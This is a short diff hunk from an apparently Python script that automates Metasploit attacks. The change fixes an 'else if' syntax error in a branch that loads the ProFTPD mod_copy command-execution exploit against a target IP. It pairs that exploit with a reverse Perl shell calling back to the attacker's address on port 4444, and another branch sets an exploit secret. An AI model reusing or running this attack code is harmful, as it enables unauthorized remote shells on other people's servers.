@@ -31,7 +31,7 @@ def main(argv):
         exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
         payload['LHOST'] = my_ip
         payload['LPORT'] = 4444
-    else if(FS == "proftpd_modcopy_exec"):
+    elif(FS == "proftpd_modcopy_exec"):
         exploit = client.modules.use('exploit', 'unix/ftp/proftpd_modcopy_exec')
         payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
         exploit['RHOSTS'] = target_ip
